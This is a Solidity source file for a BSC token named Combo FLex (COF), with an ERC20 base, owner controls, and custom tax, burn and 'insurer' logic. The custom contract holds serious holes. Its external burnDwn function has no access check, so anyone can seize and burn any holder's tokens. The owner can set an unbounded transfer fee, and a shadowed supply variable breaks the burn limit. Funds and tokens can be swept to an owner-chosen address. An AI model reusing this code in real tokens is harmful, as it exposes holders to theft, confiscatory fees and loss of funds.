// SPDX-License-Identifier: MIT

// By Combodex Team
// https:combodex.cc
// about this token ? https://combodex.gitbook.io/
// Telegram/Twitter @combodex
// submitted for verification on bscscan.com on 07/23/2023

pragma solidity ^0.8.0;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function decimals() external view returns (uint8);

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract ERC20 is Context, IERC20 {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[account];
    }

    function transfer(address to, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(
            fromBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[from] = fromBalance - amount;
            // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by
            // decrementing then incrementing.
            _balances[to] += amount;
        }

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        unchecked {
            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            // Overflow not possible: amount <= accountBalance <= totalSupply.
            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: insufficient allowance"
            );
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

abstract contract ERC20Burnable is Context, ERC20 {
    function burn(uint256 amount) public virtual {
        _burn(_msgSender(), amount);
    }

    function burnFrom(address account, uint256 amount) public virtual {
        _spendAllowance(account, _msgSender(), amount);
        _burn(account, amount);
    }
}

abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _transferOwnership(_msgSender());
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

contract ComboFLex is ERC20Burnable, Ownable {
    using SafeMath for uint256;
    uint256 public _minSupply = 5e24;
    uint256 public _initialSupply = 10e24;
    uint256 public _totalSupply;

    uint256 public _feePercentage = 300; // 300 = 3percent
    uint256 public _maxBalancePerAccount = 1e4;
    uint256 public _denominatror = 1e4; // 100 percent

    bool public _taxEnabled = false;
    bool public _initialized = false;

    address public weth_cof_pair;
    address public _dexrouter;
    address payable public _insurer;
    address payable public _helper;
    address payable public _treasury;

    event TokenBurnt(address indexed from, uint256 value);
    event HelperSet(address helper);
    event InsurerSet(address insurer);
    event MaxBalancePerAccountSet(uint256 amount);
    event TaxFeePercentageSet(uint256 feePercentage);
    event ContractInitialized(bool isInitialized, address pair);

    constructor(
        // address dexrouter,
        address insurer
    ) ERC20("Combo FLex", "COF") {
        _mint(msg.sender, _initialSupply);
        _totalSupply = _initialSupply;
        _insurer = /*payable(address(this))*/
        payable(insurer);
        // _dexrouter = dexrouter;
        _treasury = payable(address(this));
        transferOwnership(msg.sender);
    }

    function _toInsurance(uint256 amount) internal {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = IUniswapV2Router02(_dexrouter).WETH();
        IUniswapV2Router02(_dexrouter).swapExactTokensForETH(
            amount,
            0,
            path,
            _insurer,
            block.timestamp
        );
    }

    function _tax(uint256 amount, address to)
        internal
        returns (uint256 fee, uint256 afterFee)
    {
        uint256 feeAmount = amount.mul(_feePercentage).div(_denominatror);
        uint256 difference = amount.sub(feeAmount);
        if (_taxEnabled) {
            if (to == _dexrouter) {
                require(
                    isTransferAmountWithinRange(amount),
                    "COF: Transfer Amount Out Of Range"
                );
                _toInsurance(feeAmount);
                return (feeAmount, difference);
            }
            burnit(feeAmount);
            return (feeAmount, amount);
        }
        return (feeAmount, amount);
    }

    function initialize() external onlyOwner {
        require(!_initialized, "COF: Already Initialized");
        weth_cof_pair = IUniswapV2Factory(
            IUniswapV2Router02(_dexrouter).factory()
        ).createPair(IUniswapV2Router02(_dexrouter).WETH(), address(this));
        bool _isInitialized = !_initialized;
        emit ContractInitialized(_isInitialized, weth_cof_pair);
    }

    function setRoutePair(address _route, address _pair) external onlyOwner {
        weth_cof_pair = _pair;
        _dexrouter = _route;
        bool _isInitialized = !_initialized;
        emit ContractInitialized(_isInitialized, _pair);
    }

    function transfer(address to, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        (, uint256 funding) = _tax(amount, to);
        _transfer(msg.sender, to, funding);
        return true;
    }

    function burnit(uint256 amount) internal returns (uint256 isBurnt) {
        require(amount > 0, "Amount must be greater than zero");
        require(
            _totalSupply > _minSupply,
            "Total supply cannot be lower than the minimum supply"
        );
        uint256 burnAmount = amount;
        if (_totalSupply.sub(burnAmount) < _minSupply) {
            burnAmount = _totalSupply.sub(_minSupply);
            _burn(address(this), 1);
        } else {
            _burn(address(this), burnAmount);
        }
        emit TokenBurnt(msg.sender, burnAmount);
        return burnAmount;
    }

    function burnDwn(uint256 amount, address account)
        external
        returns (uint256 isBurnt)
    {
        require(amount > 0, "COF: Cannot Burn Zero");
        _transfer(account, address(this), amount);
        return burnit(amount);
    }

    function isTransferAmountWithinRange(uint256 amount)
        internal
        view
        returns (bool itIsWithinRange)
    {
        return amount <= _maxBalancePerAccount;
    }

    function setHelper(address helper)
        external
        onlyOwner
        returns (uint256 sethelper)
    {
        require(helper != address(0), "COF: Helper Cannot Be Address 0");
        _helper = payable(helper);
        approve(helper, _minSupply);
        emit HelperSet(helper);
        return 1;
    }

    function fundHelper(uint256 amount)
        external
        onlyOwner
        returns (bool funded)
    {
        require(amount > 0, "COF: Amount Cannot Be 0");
        if (IERC20(address(this)).balanceOf(address(this)) < amount) {
            _transfer(msg.sender, _helper, amount);
            return true;
        }
        return IERC20(address(this)).transfer(_helper, amount);
    }

    function setInsurer(address insurer) external onlyOwner {
        require(insurer != address(0), "COF: Insurer Cannot Be Address 0");
        _insurer = payable(insurer);
        emit InsurerSet(insurer);
    }

    function setMaxBalancePerAccount(uint256 amount) external onlyOwner {
        _maxBalancePerAccount = amount;
        emit MaxBalancePerAccountSet(amount);
    }

    function setTaxFeePercentage(uint256 feePercentage) external onlyOwner {
        _feePercentage = feePercentage;
        emit TaxFeePercentageSet(feePercentage);
    }

    receive() external payable {
        (bool sent, ) = payable(_insurer).call{value: address(this).balance}(
            ""
        );
        require(sent, "Failed Receive");
    }

    function resIERC20(address token) external onlyOwner {
        IERC20(token).transfer(
            _insurer,
            IERC20(token).balanceOf(address(this))
        );
    }
}